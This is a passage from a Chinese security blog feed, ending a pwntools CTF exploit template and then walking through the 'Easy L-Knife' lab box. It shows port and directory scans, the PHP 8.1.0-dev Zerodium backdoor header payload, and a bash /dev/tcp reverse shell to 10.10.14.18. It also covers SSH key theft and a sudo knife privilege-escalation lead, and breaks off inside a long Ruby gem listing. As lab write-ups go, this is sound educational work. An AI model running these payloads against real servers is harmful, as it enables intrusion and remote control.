operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 每周一pwn系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy L-Knife</title>
      <link href="/2025/01/09/Easy%20L-Knife/"/>
      <url>/2025/01/09/Easy%20L-Knife/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="初识"><a href="#初识" class="headerlink" title="初识"></a>初识</h2><p>访问ip<br><img src="/Rxi134_FILE/b7ab4324f4016376f0959d69bb49587d_MD5.jpeg"><br><img src="/Rxi134_FILE/87f30ac2679bebf3f86d78c3caafc1b4_MD5.jpeg"></p><p>上面的选项都点不了</p><h2 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE    SERVICE         VERSION22/tcp    open     ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCjEtN3+WZzlvu54zya9Q+D0d/jwjZT2jYFKwHe0icY7plEWSAqbP+b3ijRL6kv522KEJPHkfXuRwzt5z4CNpyUnqr6nQINn8DU0Iu/UQby+6OiQIleNUCYYaI+1mV0sm4kgmue4oVI1Q3JYOH41efTbGDFHiGSTY1lH3HcAvOFh75dCID0564T078p7ZEIoKRt1l7Yz+GeMZ870Nw13ao0QLPmq2HnpQS34K45zU0lmxIHqiK/IpFJOLfugiQF52Qt6+gX3FOjPgxk8rk81DEwicTrlir2gJiizAOchNPZjbDCnG2UqTapOm292Xg0hCE6H03Ri6GtYs5xVFw/KfGSGb7OJT1jhitbpUxRbyvP+pFy4/8u6Ty91s98bXrCyaEy2lyZh5hm7MN2yRsX+UbrSo98UfMbHkKnePg7/oBhGOOrUb77/DPePGeBF5AT029Xbz90v2iEFfPdcWj8SP/p2Fsn/qdutNQ7cRnNvBVXbNm0CpiNfoHBCBDJ1LR8p8k=|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGKC3ouVMPI/5R2Fsr5b0uUQGDrAa6ev8uKKp5x8wdqPXvM1tr4u0GchbVoTX5T/PfJFi9UpeDx/uokU3chqcFc=|   256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJbkxEqMn++HZ2uEvM0lDZy+TB8B8IAeWRBEu3a34YIb25/tcp    open     smtp?|_smtp-commands: Couldn't establish connection on port 2580/tcp    open     http            Apache httpd 2.4.41 ((Ubuntu))|_http-title:  Emergent Medical Idea| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">16:44:13] Starting: [16:44:25] 403 -  277B  - /.ht_wsr.txt                                      [16:44:28] 403 -  277B  - /.htaccess_extra                                  [16:44:28] 403 -  277B  - /.htaccessOLD                                     [16:44:28] 403 -  277B  - /.htaccess.orig                                   [16:44:28] 403 -  277B  - /.htaccessOLD2                                    [16:44:28] 403 -  277B  - /.htaccess.sample                                 [16:44:28] 403 -  277B  - /.htaccess.save[16:44:28] 403 -  277B  - /.htaccessBAK[16:44:28] 403 -  277B  - /.htaccess_orig[16:44:28] 403 -  277B  - /.htm[16:44:28] 403 -  277B  - /.htaccess_sc                                     [16:44:28] 403 -  277B  - /.html[16:44:28] 403 -  277B  - /.htaccess.bak1                                   [16:44:28] 403 -  277B  - /.htpasswd_test                                   [16:44:28] 403 -  277B  - /.htpasswds                                       [16:44:28] 403 -  277B  - /.httr-oauth[16:46:22] 403 -  277B  - /server-status                                    [16:46:22] 403 -  277B  - /server-status/   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>目录也没东西</p><h2 id="打波poc"><a href="#打波poc" class="headerlink" title="打波poc"></a>打波poc</h2><p><img src="/Rxi134_FILE/09819fade0e9add669b720c8ab24876c_MD5.jpeg"><br>还真扫出来了</p><p>直接梭进去<br><img src="/Rxi134_FILE/66e435ce82e3f0cee515d40796185289_MD5.jpeg"></p><h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><h2 id="PHP-8-1-0-dev-Zerodium-Backdoor"><a href="#PHP-8-1-0-dev-Zerodium-Backdoor" class="headerlink" title="PHP 8.1.0-dev Zerodium Backdoor"></a>PHP 8.1.0-dev Zerodium Backdoor</h2><blockquote><p>PHP 版本 8.1.0-dev 于 2021 年 3 月 28 日发布了带有后门的版本，但该后门很快被发现并删除。如果此版本的 PHP 在服务器上运行，攻击者可以通过发送 User-Agentt 标头来执行任意代码。</p></blockquote><pre class="line-numbers language-text" data-language="text"><code class="language-text">User-Agentt: zerodiumsystem("whoami");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/1cca7c9ea274d53283b29ab80f5092a6_MD5.jpeg"></p><p>直接反弹shell</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">User-Agentt: zerodiumsystem("bash -c 'bash -i >&amp; /dev/tcp/10.10.14.18/1234 0>&amp;1'");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/ad461f5f0c4572a68bba698474401ef4_MD5.jpeg"></p><h1 id="驻足"><a href="#驻足" class="headerlink" title="驻足"></a>驻足</h1><h2 id="窃取ssh私钥（失败）"><a href="#窃取ssh私钥（失败）" class="headerlink" title="窃取ssh私钥（失败）"></a>窃取ssh私钥（失败）</h2><p>窃取 ~&#x2F;.ssh&#x2F;id_rsa，但是要求密码原语<br><img src="/Rxi134_FILE/a6fa55b321445fa5cba3dd7bc6847291_MD5.jpeg"></p><h2 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h2><p>那直接上线msf叭</p><p><img src="/Rxi134_FILE/dd5cd3f9e52b0a7d8db8fe98281555fc_MD5.jpeg"></p><p>python起个伪终端</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="linpeas"><a href="#linpeas" class="headerlink" title="linpeas"></a>linpeas</h2><p><img src="/Rxi134_FILE/6176fb0534f0a272d301890275d5a825_MD5.jpeg"><br>sudo -l 可用无密码 sudo 执行 <code>/usr/bin/knife</code></p><p>是一个超链接指向<code>/opt/chef-workstation/bin/knife</code>，打开是一个ruby脚本<br><img src="/Rxi134_FILE/04afbf37fab7d72872d05a990dc57b47_MD5.jpeg"></p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment">#!/opt/chef-workstation/embedded/bin/ruby --disable-gems</span><span class="token comment">#--APP_BUNDLER_BINSTUB_FORMAT_VERSION=1--</span><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"rubygems"</span></span><span class="token keyword">begin</span>  <span class="token comment"># this works around rubygems/rubygems#2196 and can be removed in rubygems > 2.7.6</span>  <span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"rubygems/bundler_version_finder"</span></span><span class="token keyword">rescue</span> LoadError  <span class="token comment"># probably means rubygems is too old or too new to have this class, and we don't care</span><span class="token keyword">end</span><span class="token comment"># avoid appbundling if we are definitely running within a Bundler bundle.</span><span class="token comment"># most likely the check for defined?(Bundler) is enough since we don't require</span><span class="token comment"># bundler above, but just for paranoia's sake also we test to see if Bundler is</span><span class="token comment"># really doing its thing or not.</span><span class="token keyword">unless</span> <span class="token keyword">defined</span><span class="token operator">?</span><span class="token punctuation">(</span>Bundler<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> Bundler<span class="token punctuation">.</span>instance_variable_defined<span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@load"</span></span><span class="token punctuation">)</span>  <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"GEM_HOME"</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"GEM_PATH"</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">nil</span> <span class="token keyword">unless</span> <span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"APPBUNDLER_ALLOW_RVM"</span></span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string-literal"><span class="token string">"true"</span></span>  <span class="token double-colon punctuation">::</span>Gem<span class="token punctuation">.</span>clear_paths  gem <span class="token string-literal"><span class="token string">"activesupport"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 5.2.4.5"</span></span>  gem <span class="token string-literal"><span class="token string">"addressable"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.7.0"</span></span>  gem <span class="token string-literal"><span class="token string">"appbundler"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.13.2"</span></span>  gem <span class="token string-literal"><span class="token string">"artifactory"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.0.15"</span></span>  gem <span class="token string-literal"><span class="token string">"ast"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 2.4.2"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-eventstream"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.1.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-partitions"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.427.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-apigateway"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.59.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-apigatewayv2"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.31.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-applicationautoscaling"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.49.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-athena"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.35.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-autoscaling"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.53.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-batch"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.43.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-budgets"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.37.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-cloudformation"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.47.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-cloudfront"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.48.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-cloudhsm"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.28.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-cloudhsmv2"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.32.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-cloudtrail"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.33.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-cloudwatch"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.49.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-cloudwatchevents"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.40.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-cloudwatchlogs"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.39.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-codecommit"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.41.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-codedeploy"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.38.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-codepipeline"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.41.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-cognitoidentity"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.29.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-cognitoidentityprovider"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.48.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-configservice"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.57.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-core"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.112.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-costandusagereportservice"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.29.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-databasemigrationservice"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.50.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-dynamodb"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.59.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-ec2"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.224.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-ecr"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.41.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-ecs"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.74.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-efs"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.37.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-eks"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.48.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-elasticache"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.53.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-elasticbeanstalk"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.41.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-elasticloadbalancing"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.30.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-elasticloadbalancingv2"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.60.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-elasticsearchservice"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.48.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-firehose"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.36.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-glue"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.82.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-guardduty"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.44.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-iam"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.48.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-kafka"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.34.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-kinesis"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.31.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-kms"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.42.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-lambda"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.59.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-organizations"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.55.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-ram"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.22.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-rds"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.114.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-redshift"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.54.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-route53"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.46.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-route53domains"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.29.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-route53resolver"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.23.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-s3"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.88.1"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-secretsmanager"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.43.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-securityhub"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.40.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-servicecatalog"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.57.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-ses"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.37.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-shield"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.34.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-sms"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.28.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-sns"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.38.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-sqs"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.36.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-ssm"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.104.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-states"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.37.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sdk-transfer"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.29.0"</span></span>  gem <span class="token string-literal"><span class="token string">"aws-sigv4"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.2.2"</span></span>  gem <span class="token string-literal"><span class="token string">"axiom-types"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.1.1"</span></span>  gem <span class="token string-literal"><span class="token string">"azure_graph_rbac"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.17.2"</span></span>  gem <span class="token string-literal"><span class="token string">"azure_mgmt_compute"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.21.1"</span></span>  gem <span class="token string-literal"><span class="token string">"azure_mgmt_key_vault"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.17.7"</span></span>  gem <span class="token string-literal"><span class="token string">"azure_mgmt_network"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.26.0"</span></span>  gem <span class="token string-literal"><span class="token string">"azure_mgmt_resources"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.18.1"</span></span>  gem <span class="token string-literal"><span class="token string">"azure_mgmt_security"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.19.0"</span></span>  gem <span class="token string-literal"><span class="token string">"azure_mgmt_storage"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 0.22.0"</span></span>  gem <span class="token string-literal"><span class="token string">"bcrypt_pbkdf"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.1.0.rc2"</span></span>  gem <span class="token string-literal"><span class="token string">"bcrypt_pbkdf"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.1.0.rc2"</span></span>  gem <span class="token string-literal"><span class="token string">"bcrypt_pbkdf"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.1.0.rc2"</span></span>  gem <span class="token string-literal"><span class="token string">"berkshelf"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 7.2.0"</span></span>  gem <span class="token string-literal"><span class="token string">"binding_of_caller"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 1.0.0"</span></span>  gem <span class="token string-literal"><span class="token string">"builder"</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"= 3.2.4"</span></span>  gem <span class="token 